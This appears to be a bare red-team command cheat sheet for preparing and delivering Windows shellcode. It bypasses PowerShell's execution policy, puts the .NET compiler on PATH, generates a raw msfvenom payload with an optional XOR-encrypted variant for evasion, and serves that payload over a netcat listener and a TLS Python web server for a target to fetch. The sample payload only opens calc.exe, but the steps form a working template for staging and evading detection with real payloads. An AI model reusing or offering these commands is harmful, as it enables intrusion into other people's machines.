Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process 


//32 bit
$env:Path += 'C:\Windows\Microsoft.NET\Framework\v4.0.30319'

//64 bit
$env:Path += 'C:\Windows\Microsoft.NET\Framework64\v4.0.30319'



//create payload
msfvenom -p windows/exec cmd="calc.exe" exitfunc=none/thread -f raw -o shell
msfvenom -p windows/exec cmd="calc.exe" exitfunc=none/thread --encrypt=xor --encrypt=YoloSpaceHacker -f raw -o shell


//serve payload
nc -lvnp 9000 < shell

sudo python3 -c "import http.server, ssl;server_address=('0.0.0.0',443);httpd=http.server.HTTPServer(server_address,http.server.SimpleHTTPRequestHandler);context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER);context.load_cert_chain('localhost.pem', 'localhost.key');httpd.socket=context.wrap_socket(httpd.socket,server_side=True);httpd.serve_forever()"

